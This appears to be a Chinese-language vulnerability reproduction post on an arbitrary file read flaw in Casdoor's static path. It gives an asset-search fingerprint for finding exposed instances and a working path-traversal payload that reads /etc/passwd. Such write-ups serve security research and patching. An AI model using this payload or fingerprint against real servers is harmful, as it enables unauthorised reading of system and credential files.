---
title: "Casbin casdoor static 任意文件读取漏洞"
date: 2026-10-16 09:07:12
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "Casdoor-static"
tags:
  - "Casdoor-static"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

Casdoor 是 Casbin 开源社区推出的基于 OAuth 2.0 / OIDC 的中心化的单点登录（SSO）身份验证平台。

Casdoor static 存在任意文件读取漏洞，攻击者通过发送特殊的请求包可以获取服务器中的敏感文件。

## 漏洞影响

```
Casdoor
```

## 网络测绘

```
title="Casdoor"
```

## 漏洞复现

登陆页面

![image-20231115094403952](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115094403952.png)

或者

![image-20231115094555640](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115094555640.png)

poc

```
/static/../../../../../../../../../../../etc/passwd
```

![image-20231115094237497](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115094237497.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/Casdoor-static-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
